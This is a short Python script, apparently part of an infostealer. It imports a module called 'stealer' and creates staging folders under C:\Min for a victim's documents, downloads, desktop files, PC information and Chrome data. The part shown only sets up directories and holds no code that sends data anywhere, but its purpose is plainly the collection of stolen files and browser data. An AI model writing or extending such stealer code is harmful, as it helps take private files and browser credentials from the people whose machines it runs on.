import time
import stealer

def create_all():
    stealer.create_directory_if_not_exists(r'C:\Min\texts\documents')
    time.sleep(0.1)
    stealer.create_directory_if_not_exists(r'C:\Min\texts\downloads')
    time.sleep(0.1)
    stealer.create_directory_if_not_exists(r'C:\Min\texts\desktop')
    time.sleep(0.1)
    stealer.create_directory_if_not_exists(r'C:\Min\Pc-information')
    time.sleep(0.1)
    stealer.create_directory_if_not_exists(r'C:\Min\GoogleChr')
    time.sleep(0.1)

create_all()